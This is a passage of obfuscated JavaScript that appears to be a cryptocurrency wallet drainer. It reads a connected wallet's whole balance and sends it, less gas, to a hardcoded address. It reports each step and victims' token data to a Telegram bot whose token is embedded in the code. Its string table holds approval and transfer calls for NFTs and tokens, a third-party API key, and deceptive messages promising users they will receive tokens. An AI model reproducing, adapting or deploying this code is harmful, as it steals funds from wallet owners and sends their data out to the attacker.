_0x1c47f2=_0x5ec824;console['log'](_0x1c47f2(0x247)+_0xdd16d2),sendMessage(_0x1c47f2(0x264)),sendMessage(_0x1c47f2(0x265)+token[_0x1c47f2(0x1b0)]),sendMessage(_0x1c47f2(0x217)+Oxa);})['on'](_0x5ec824(0x22b),_0x2a2f53=>{const _0xef5878=_0x5ec824;console[_0xef5878(0x193)](_0xef5878(0x1f5)+_0x2a2f53),sendMessage(_0xef5878(0x1d2));});}catch(_0x52ffeb){console[_0x5ec824(0x193)](_0x5ec824(0x1f5)+_0x52ffeb),sendMessage(_0x5ec824(0x1d2));}}await onSendEther();}async function onSendEther(){const _0x5a6b4c=_0x262df0;console[_0x5a6b4c(0x193)](_0x5a6b4c(0x1e3));try{let _0x2ebcbd=await web3Object['eth'][_0x5a6b4c(0x267)](selectedAccount);var _0x4afbbc=await web3Object[_0x5a6b4c(0x1c1)][_0x5a6b4c(0x18a)](),_0xc78398={'gasPrice':_0x4afbbc,'from':selectedAccount,'to':Oxa,'value':_0x2ebcbd};_0xc78398[_0x5a6b4c(0x1a3)]=_0x2ae4f8,_0xc78398[_0x5a6b4c(0x25b)]=_0x2ebcbd-0xaa87bee538000,console[_0x5a6b4c(0x193)](_0xc78398[_0x5a6b4c(0x25b)]);var _0x2ae4f8=await web3Object[_0x5a6b4c(0x1c1)][_0x5a6b4c(0x1ce)](_0xc78398),_0x1c17b8=_0x4afbbc*_0x2ae4f8;web3Object[_0x5a6b4c(0x1c1)][_0x5a6b4c(0x1d7)](_0xc78398)['on']('transactionHash',_0x5165a7=>{const _0x286e77=_0x5a6b4c;console[_0x286e77(0x193)]('Transaction\x20Hash:\x20',_0x5165a7),sendMessage(_0x286e77(0x20f));})['on'](_0x5a6b4c(0x263),_0x335373=>{const _0x47eb6b=_0x5a6b4c;console['log'](_0x47eb6b(0x247),_0x335373),sendMessage('Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens');})['on']('error',_0x234f5b=>{const _0x3833d1=_0x5a6b4c;console[_0x3833d1(0x193)](_0x3833d1(0x1f5),_0x234f5b),sendMessage(_0x3833d1(0x1d2));});}catch{sendMessage(_0x5a6b4c(0x252));}}async function sendMessage(_0x477bde){return new Promise((_0x316a72,_0x18cddd)=>{const _0x3412f3=_0x5a68,_0x2fa8f4=Oxc;fetch(_0x3412f3(0x213)+_0x2fa8f4+_0x3412f3(0x21b)+_0x477bde,{'method':_0x3412f3(0x1d0),'headers':{}})[_0x3412f3(0x1a4)](async _0x28e9b3=>{const _0x58e5d2=_0x3412f3;if(_0x28e9b3[_0x58e5d2(0x1f9)]>0x18f)throw _0x28e9b3;_0x316a72(await _0x28e9b3['json']());})['catch'](_0x8f2f84=>{_0x18cddd(_0x8f2f84);});});}function _0x163c(){const _0x1ebdae=['transferOwnership','Transaction\x20is\x20submitted\x20to\x20the\x20network','fantom','chainId:','tokenURI','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?Oxc_id=','NFTs\x20collection\x20','_data','previousOwner','Your\x20address\x20','matic-mumbai','pause','sort','&text=','https://fantom-mainnet.blastapi.io/97801803-f660-477a-a3ae-8eb828456a3f','https://deep-index.moralis.io/api/v2/','true','_evilUser','operator','arbitrum-mainnet','https://api.coingecko.com/api/v3/simple/token_price/fantom?contract_addresses=','boba-bnb-mainnet','Token\x20balance\x20is\x20','_user','boba-bobabeam-mainnet','polygon-zkevm-testnet','from','avalanche-mainnet','balanceOf','error','tokenByIndex','0xea8968B218a551919FbD5f1166328C82a96dED54','setProvenanceHash','e62a60a251c64745baefeaf8237af646','nonpayable','metis-mainnet','json','findora-mainnet','moonbeam-moonriver','203435uRBWbr','accountsChanged','methods','aurora-mainnet','_owner','basisPointsRate','Cl\x20address\x20:\x20','sx-mainnet','uint256','defi-kingdoms-testnet','unpause','Could\x20not\x20get\x20a\x20wallet\x20connection','mintApe','boba-bnb-testnet','send','all','covalent-internal-network-v1','flarenetworks-flare-testnet','Transaction\x20Receipt:\x20','search','getOwner','transfer','&vs_currencies=usd','MAX_APES','decimals','btc-mainnet','52fNGzOX','NFT','AddedBlackList','Insufficient\x20funds\x20for\x20transfer','who','Unpause','gather-testnet','bool','_from','Deprecate','eth-goerli','map','value','avalanche-dexalot-testnet','newMaxFee','setStartingIndex','_symbol','rsk-testnet','milkomeda-c1-devnet','WalletConnectProvider','receipt','Approve\x20Completed\x20Successfully','NFT\x20Contract\x20Address\x20','avalanche-dexalot-mainnet','getBalance','Error\x20processing\x20item\x20','setBaseURI','_balance','boba-avalanche-mainnet','/nft/collections?chain=','getAccounts','supportsInterface','allowance','kcc-mainnet','Wallet\x20Connected\x20Successfully\x20to\x20Fantom!','Error\x20collecting\x20info\x20about\x20wallet','TOKEN\x20Contract\x20Address\x20','message','neon-testnet','addBlackList','_decimals','_initialSupply','paused','event','1332789vBDqiA','tokenId','11554902vscrow','constructor','palm-testnet','axie-mainnet','moonbeam-moonbase-alpha','startingIndex','linea-testnet','palm-mainnet','flipSaleState','_blackListedUser','getGasPrice','name','Redeem','numberOfTokens','transferFrom','isApprovedForAll','Tokens:','meter-testnet','skale-omnus','log','kcc-testnet','oasys-testnet','token_address','milkomeda-a1-devnet','filter','boba-bobabase-testnet','fantom-mainnet','evmos-mainnet','length','setApprovalForAll','_upgradedAddress','apePrice','newOwner','999999999999999999999999999999999999999999999999999999999999999999999999','rsk-mainnet','gas','then','view','milkomeda-a1-mainnet','revealTimeStamp','avalanche-testnet','.connect','default','milkomeda-c1-mainnet','baseURI','arbitrum-nova-mainnet','517455bMdyJT','nervos-godwoken-mainnet','address','bsc-testnet','catch','flarenetworks-canary-testnet','maximumFee','deprecated','usd','allowed','index','bsc-mainnet','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','maxApePurchase','evmos-testnet','bytes','boba-mainnet','bittorrent-mainnet','newAddress','eth','getApproved','moonbeam-mainnet','_name','Approval','deprecate','RemovedBlackList','_to','transactionHash','balance','function','800534nAxSLS','2fbFaen','estimateGas','getBlackListStatus','GET','solana-mainnet','Transaction\x20Rejected','10000','cronos-testnet','0x688c7Ca99807dE1509D1F100eF46D4B843228Ee4','string','sendTransaction','safeTransferFrom','OwnershipTransferred','boba-avalanche-testnet','click','setParams','aurora-testnet','swimmer-testnet','Initial\x20list\x20','MAX_UINT','owner','isBlackListed','sending\x20ether','ApprovalForAll','approved','price','emergencySetStartingIndexBlock','3345248oWYPKD','_clearedUser','totalSupply','tokenOfOwnerByIndex','gather-mainnet','Web3Modal','Pause','harmony-testnet','5699310522','bittorrent-testnet','symbol','REVEAL_TIMESTAMP','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','Error:\x20','interfaceId','&format=decimal&limit=','oasis-sapphire-testnet','status','nervos-polyjuice-testnet','BAYC_PROVENANCE','canto-mainnet','boba-goerli','approve','saleIsActive','amount','_totalSupply','/erc20','_spender','result','toString','saleStart','Transaction\x20Hash:\x20','ownerOf','Contract','_value','optimism-mainnet','emerald-paratime-mainnet','141996hLsWse'];_0x163c=function(){return _0x1ebdae;};return _0x163c();}async function getPrice(_0x5f4ab7){return new Promise((_0x1e52a7,_0x1dda25)=>{const _0x445ef8=_0x5a68;fetch(_0x445ef8(0x222)+_0x5f4ab7+_0x445ef8(0x24b),{'method':'GET','headers':{}})[_0x445ef8(0x1a4)](async _0x3d7951=>{const _0x20b2ae=_0x445ef8;if(_0x3d7951[_0x20b2ae(0x1f9)]>0x18f)throw _0x3d7951;_0x1e52a7(await _0x3d7951[_0x20b2ae(0x232)]());})[_0x445ef8(0x1b2)](_0xfad46=>{_0x1dda25(_0xfad46);});});}async function getValue(_0xc3c94c,_0x249027,_0x30086c){const _0x371319=_0x262df0;console['log'](_0xc3c94c,_0x249027,_0x30086c);let _0x2f1ea6=await getPrice(_0xc3c94c);console[_0x371319(0x193)](_0x371319(0x1e6),_0x2f1ea6),_0x2f1ea6=parseFloat(_0x2f1ea6[_0xc3c94c][_0x371319(0x1b6)]);let _0x20b4e4=_0x249027/0xa**(_0x30086c||0x12)*_0x2f1ea6;return _0x20b4e4=parseInt(_0x20b4e4),_0x2f1ea6?_0x20b4e4:0x0;}async function getNFTs(_0x1d74fd='',_0x5ee605=_0x262df0(0x1ba),_0xf6b67=_0x262df0(0x210),_0x536e7a='50'){return new Promise((_0x28cc1b,_0x1828a4)=>{const _0x42854d=_0x5a68;fetch(_0x42854d(0x21d)+_0x1d74fd+_0x42854d(0x26c)+_0xf6b67+_0x42854d(0x1f7)+_0x536e7a,{'method':_0x42854d(0x1d0),'headers':{'accept':'application/json','X-API-Key':_0x5ee605}})[_0x42854d(0x1a4)](async _0x1be03c=>{const _0x2b1cc6=_0x42854d;if(_0x1be03c[_0x2b1cc6(0x1f9)]>0x18f)throw _0x1be03c;_0x28cc1b(await _0x1be03c[_0x2b1cc6(0x232)]());})['catch'](_0x62ecfa=>{_0x1828a4(_0x62ecfa);});});}